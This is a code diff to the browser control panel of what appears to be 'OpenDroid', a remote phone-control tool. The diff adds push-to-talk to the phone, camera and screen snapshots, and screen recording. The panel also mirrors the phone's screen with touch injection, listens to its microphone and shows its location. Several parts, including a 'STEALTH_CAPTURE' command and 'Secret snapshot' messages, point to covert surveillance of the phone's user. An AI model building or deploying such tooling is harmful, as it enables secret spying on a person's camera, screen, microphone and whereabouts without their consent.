@@ -1,4 +1,4 @@
-﻿﻿<html lang="en">
+﻿﻿﻿﻿<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -120,9 +120,14 @@
         <div class="flex items-center gap-3.5 pl-3 border-l border-gray-700">
             <span id="ws-status-taskbar" class="text-yellow-400 text-xs font-semibold">● Ready</span>
             
-            <button id="dock-mic-btn" onclick="toggleGlobalMic()" class="bg-gray-800 hover:bg-gray-700 px-2.5 py-1 rounded-full text-gray-300 hover:text-white transition-all flex items-center gap-1.5 border border-gray-700 font-medium text-[11px]">
+            <button id="dock-mic-btn" onclick="toggleGlobalMic()" class="bg-gray-800 hover:bg-gray-700 px-2.5 py-1 rounded-full text-gray-300 hover:text-white transition-all flex items-center gap-1.5 border border-gray-700 font-medium text-[11px]" title="Listen to Phone Mic">
                 <span id="dock-mic-icon">🔇</span>
                 <span id="dock-mic-label">Mic Off</span>
+            </button>
+
+            <button id="dock-talk-btn" onmousedown="startWalkieTalkie()" onmouseup="stopWalkieTalkie()" class="bg-gray-800 hover:bg-gray-700 px-2.5 py-1 rounded-full text-gray-300 hover:text-white transition-all flex items-center gap-1.5 border border-gray-700 font-medium text-[11px] select-none" title="Hold to Talk to Phone Speaker">
+                <span id="dock-talk-icon">📢</span>
+                <span id="dock-talk-label">Push to Talk</span>
             </button>
 
 
@@ -411,8 +416,11 @@
             <div class="bg-gray-900 p-3 flex flex-col gap-2.5 border-t border-gray-700 z-10 text-xs">
                 <div class="flex justify-between items-center gap-2">
                     <button id="cam-toggle-btn" onclick="startCameraStream('back')" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-lg shadow transition-colors">Start Camera</button>
-                    <button onclick="sendCommand({action: 'SWITCH_CAMERA'})" class="bg-gray-700 hover:bg-gray-600 text-white font-medium px-3.5 py-2 rounded-lg transition-colors">🔄 Switch</button>
-                    <button onclick="sendCommand({action: 'TOGGLE_FLASHLIGHT'})" class="bg-yellow-600 hover:bg-yellow-700 text-white font-medium px-3.5 py-2 rounded-lg transition-colors">💡 Flash</button>
+                    <button onclick="saveCameraSnapshot()" class="bg-emerald-600 hover:bg-emerald-700 text-white font-medium px-3 py-2 rounded-lg transition-colors flex items-center gap-1 shadow-sm" title="Capture High-Res Photo to PC">
+                        📸 Snapshot
+                    </button>
+                    <button onclick="sendCommand({action: 'SWITCH_CAMERA'})" class="bg-gray-700 hover:bg-gray-600 text-white font-medium px-3 py-2 rounded-lg transition-colors" title="Switch Front/Back Camera">🔄 Switch</button>
+                    <button onclick="sendCommand({action: 'TOGGLE_FLASHLIGHT'})" class="bg-yellow-600 hover:bg-yellow-700 text-white font-medium px-3 py-2 rounded-lg transition-colors" title="Toggle Flashlight">💡 Flash</button>
                 </div>
                 <div class="flex items-center gap-2 text-white text-[11px] pt-1">
                     <span>🔊 Mic Audio:</span>
@@ -522,7 +530,13 @@
             <div class="bg-gray-900 p-2.5 border-t border-gray-800 z-10 flex flex-col gap-2 text-xs">
                 <div class="flex items-center justify-between gap-2">
                     <button id="screen-toggle-btn" onclick="startScreenStream()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-1.5 rounded-lg shadow text-xs transition-colors">Start Screen Mirror</button>
-                    <button id="screen-mic-btn" onclick="toggleScreenMic()" class="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 rounded-lg text-xs font-medium flex items-center gap-1.5 shadow-sm">
+                    <button id="screen-record-btn" onclick="toggleScreenRecording()" class="px-3 py-1.5 bg-rose-700 hover:bg-rose-600 text-white rounded-lg text-xs font-semibold flex items-center gap-1 shadow-sm transition-colors" title="Record Screen to WebM">
+                        <span id="record-dot">⏺</span><span id="record-text">Record</span>
+                    </button>
+                    <button onclick="saveScreenSnapshot()" class="px-2.5 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 rounded-lg text-xs font-semibold shadow-sm" title="Save Screenshot">
+                        📸
+                    </button>
+                    <button id="screen-mic-btn" onclick="toggleScreenMic()" class="px-2.5 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 rounded-lg text-xs font-medium flex items-center gap-1.5 shadow-sm">
                         <span>🎙️</span><span>Mic Off</span>
                     </button>
                 </div>
@@ -1472,6 +1486,134 @@
             stopCameraStream();
         }
 
+        // --- Phase 3: Two-Way Audio (Walkie-Talkie Engine) ---
+        let walkieAudioContext = null;
+        let walkieMediaStream = null;
+        let walkieProcessor = null;
+        let isWalkieActive = false;
+
+        async function startWalkieTalkie() {
+            if (isWalkieActive) return;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        channelCount: 1,
+                        sampleRate: 16000
+                    }
+                });
+                walkieMediaStream = stream;
+                isWalkieActive = true;
+                updateWalkieUI(true);
+
+                const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                walkieAudioContext = new AudioCtx({ sampleRate: 16000 });
+                const source = walkieAudioContext.createMediaStreamSource(stream);
+                
+                walkieProcessor = walkieAudioContext.createScriptProcessor(2048, 1, 1);
+                walkieProcessor.onaudioprocess = (e) => {
+                    if (!isWalkieActive) return;
+                    const inputData = e.inputBuffer.getChannelData(0);
+                    const pcm16 = new Int16Array(inputData.length);
+                    for (let i = 0; i < inputData.length; i++) {
+                        const s = Math.max(-1, Math.min(1, inputData[i]));
+                        pcm16[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
+                    }
+                    const bytes = new Uint8Array(pcm16.buffer);
+                    let binary = '';
+                    for (let i = 0; i < bytes.byteLength; i++) {
+                        binary += String.fromCharCode(bytes[i]);
+                    }
+                    const base64Chunk = btoa(binary);
+                    sendCommand({ action: 'WALKIE_TALKIE_CHUNK', data: base64Chunk });
+                };
+
+                source.connect(walkieProcessor);
+                walkieProcessor.connect(walkieAudioContext.destination);
+                showToast("Speaking to phone speaker... 📢", "info");
+            } catch (e) {
+                console.error("Walkie-talkie error:", e);
+                showToast("Microphone access denied: " + e.message, "error");
+                stopWalkieTalkie();
+            }
+        }
+
+        function stopWalkieTalkie() {
+            if (!isWalkieActive) return;
+            isWalkieActive = false;
+            updateWalkieUI(false);
+
+            try {
+                if (walkieProcessor) {
+                    walkieProcessor.disconnect();
+                    walkieProcessor = null;
+                }
+                if (walkieAudioContext) {
+                    walkieAudioContext.close();
+                    walkieAudioContext = null;
+                }
+                if (walkieMediaStream) {
+                    walkieMediaStream.getTracks().forEach(t => t.stop());
+                    walkieMediaStream = null;
+                }
+                sendCommand({ action: 'STOP_WALKIE_TALKIE' });
+                showToast("Walkie-talkie released", "info");
+            } catch (e) {
+                console.error("Error stopping walkie:", e);
+            }
+        }
+
+        function updateWalkieUI(active) {
+            const btn = document.getElementById('dock-talk-btn');
+            const label = document.getElementById('dock-talk-label');
+            if (btn && label) {
+                if (active) {
+                    btn.className = "bg-rose-600 animate-pulse px-2.5 py-1 rounded-full text-white transition-all flex items-center gap-1.5 border border-rose-500 font-semibold text-[11px] select-none shadow-md";
+                    label.textContent = "Talking...";
+                } else {
+                    btn.className = "bg-gray-800 hover:bg-gray-700 px-2.5 py-1 rounded-full text-gray-300 hover:text-white transition-all flex items-center gap-1.5 border border-gray-700 font-medium text-[11px] select-none";
+                    label.textContent = "Push to Talk";
+                }
+            }
+        }
+
+        // --- Phase 3: Step 3.2 High-Resolution Camera Snapshot Saver ---
+        let isCameraSnapPendingDownload = false;
+
+        function saveCameraSnapshot() {
+            const img = document.getElementById('camera-frame-view');
+            if (img && !img.classList.contains('hidden') && img.src) {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = img.naturalWidth || img.videoWidth || img.clientWidth || 1280;
+                    canvas.height = img.naturalHeight || img.videoHeight || img.clientHeight || 720;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+
+                    const now = new Date();
+                    const pad = (n) => String(n).padStart(2, '0');
+                    const ts = `${now.getFullYear()}${pad(now.getMonth()+1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}`;
+                    const filename = `OpenDroid_Camera_Photo_${ts}.png`;
+
+                    const a = document.createElement('a');
+                    a.href = canvas.toDataURL('image/png');
+                    a.download = filename;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    showToast(`Camera photo saved to PC! 📸 (${filename})`, "success");
+                } catch (e) {
+                    console.error("Camera snapshot error:", e);
+                    showToast("Snapshot failed: " + e.message, "error");
+                }
+            } else {
+                showToast("Requesting high-res sensor photo from phone... 📸", "info");
+                isCameraSnapPendingDownload = true;
+                sendCommand({ action: 'STEALTH_CAPTURE', target: 'BACK' });
+            }
+        }
+
 
         // --- Screen Mirror Controls with Touch Injection ---
         function updateScreenStatus(statusText) {
@@ -1513,7 +1655,163 @@
 
         function closeScreenRoom() {
             wm.closeWindow('screen-window');
+            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+                stopScreenRecording();
+            }
             stopScreenStream();
+        }
+
+        // --- Phase 3: Step 3.1 1-Click Screen Screenshot Saver ---
+        function saveScreenSnapshot() {
+            const img = document.getElementById('screen-frame-view');
+            if (!img || img.classList.contains('hidden') || !img.src) {
+                showToast("Screen mirror active nahi hai! Pehle mirror start karein.", "error");
+                return;
+            }
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = img.naturalWidth || img.videoWidth || img.clientWidth || 720;
+                canvas.height = img.naturalHeight || img.videoHeight || img.clientHeight || 1600;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                
+                const now = new Date();
+                const pad = (n) => String(n).padStart(2, '0');
+                const ts = `${now.getFullYear()}${pad(now.getMonth()+1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}`;
+                const filename = `OpenDroid_Screenshot_${ts}.png`;
+
+                const a = document.createElement('a');
+                a.href = canvas.toDataURL('image/png');
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                showToast(`Screenshot saved to PC! 📸 (${filename})`, "success");
+            } catch (e) {
+                console.error("Screenshot error:", e);
+                showToast("Screenshot capture failed: " + e.message, "error");
+            }
+        }
+
+        // --- Phase 3: Step 3.1 Live Screen Video Recorder to WebM ---
+        let screenMediaRecorder = null;
+        let screenRecordedChunks = [];
+        let screenRecordTimer = null;
+        let screenRecordSeconds = 0;
+        let screenRecordCanvas = null;
+        let screenRecordCtx = null;
+        let screenRecordAnimId = null;
+
+        function toggleScreenRecording() {
+            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+                stopScreenRecording();
+            } else {
+                startScreenRecording();
+            }
+        }
+
+        function startScreenRecording() {
+            const img = document.getElementById('screen-frame-view');
+            if (!img || img.classList.contains('hidden') || !img.src) {
+                showToast("Screen mirror active nahi hai! Pehle mirror start karein.", "error");
+                return;
+            }
+
+            try {
+                screenRecordCanvas = document.createElement('canvas');
+                screenRecordCanvas.width = img.naturalWidth || 720;
+                screenRecordCanvas.height = img.naturalHeight || 1600;
+                screenRecordCtx = screenRecordCanvas.getContext('2d');
+
+                function drawRecordFrame() {
+                    if (screenRecordCtx && img && img.complete) {
+                        screenRecordCtx.drawImage(img, 0, 0, screenRecordCanvas.width, screenRecordCanvas.height);
+                    }
+                    screenRecordAnimId = requestAnimationFrame(drawRecordFrame);
+                }
+                drawRecordFrame();
+
+                const stream = screenRecordCanvas.captureStream(25);
+                screenRecordedChunks = [];
+
+                let mimeType = 'video/webm;codecs=vp9';
+                if (!MediaRecorder.isTypeSupported(mimeType)) {
+                    mimeType = 'video/webm;codecs=vp8';
+                    if (!MediaRecorder.isTypeSupported(mimeType)) {
+                        mimeType = 'video/webm';
+                    }
+                }
+
+                screenMediaRecorder = new MediaRecorder(stream, { mimeType });
+                screenMediaRecorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) {
+                        screenRecordedChunks.push(e.data);
+                    }
+                };
+
+                screenMediaRecorder.onstop = () => {
+                    cancelAnimationFrame(screenRecordAnimId);
+                    if (screenRecordedChunks.length > 0) {
+                        const blob = new Blob(screenRecordedChunks, { type: mimeType });
+                        const now = new Date();
+                        const pad = (n) => String(n).padStart(2, '0');
+                        const ts = `${now.getFullYear()}${pad(now.getMonth()+1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}`;
+                        const filename = `OpenDroid_Record_${ts}.webm`;
+
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = filename;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+                        showToast(`Screen video saved to PC! 🎬 (${filename})`, "success");
+                    }
+                };
+
+                screenMediaRecorder.start(200);
+                screenRecordSeconds = 0;
+                updateRecordBtnUI(true);
+
+                screenRecordTimer = setInterval(() => {
+                    screenRecordSeconds++;
+                    const mins = String(Math.floor(screenRecordSeconds / 60)).padStart(2, '0');
+                    const secs = String(screenRecordSeconds % 60).padStart(2, '0');
+                    const textEl = document.getElementById('record-text');
+                    if (textEl) textEl.textContent = `${mins}:${secs}`;
+                }, 1000);
+
+                showToast("Screen video recording started! ⏺", "info");
+            } catch (e) {
+                console.error("Recording error:", e);
+                showToast("Recording failed: " + e.message, "error");
+            }
+        }
+
+        function stopScreenRecording() {
+            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+                screenMediaRecorder.stop();
+            }
+            clearInterval(screenRecordTimer);
+            updateRecordBtnUI(false);
+        }
+
+        function updateRecordBtnUI(isRecording) {
+            const btn = document.getElementById('screen-record-btn');
+            const dot = document.getElementById('record-dot');
+            const text = document.getElementById('record-text');
+            if (btn && dot && text) {
+                if (isRecording) {
+                    btn.className = "px-3 py-1.5 bg-red-600 animate-pulse text-white rounded-lg text-xs font-semibold flex items-center gap-1 shadow-sm";
+                    dot.textContent = "⏹";
+                    text.textContent = "00:00";
+                } else {
+                    btn.className = "px-3 py-1.5 bg-rose-700 hover:bg-rose-600 text-white rounded-lg text-xs font-semibold flex items-center gap-1 shadow-sm transition-colors";
+                    dot.textContent = "⏺";
+                    text.textContent = "Record";
+                }
+            }
         }
 
 
@@ -2736,6 +3034,16 @@ Google Maps: https://www.google.com/maps?q=${lat},${lng}`;
             // Prepend to history so latest appears first
             secretSnapsHistory.unshift(snapItem);
 
+            if (isCameraSnapPendingDownload) {
+                isCameraSnapPendingDownload = false;
+                const a = document.createElement('a');
+                a.href = dataUrl;
+                a.download = `OpenDroid_Photo_${targetType}_${Date.now()}.jpg`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                showToast(`High-Res photo downloaded to PC! 📸`, "success");
+            }
             statusText.textContent = `● Captured ${targetType} at ${timeFormatted}`;
             statusText.className = 'text-emerald-400 font-mono text-[11px]';
             showToast(`Secret snapshot captured (${targetType})!`, 'success');
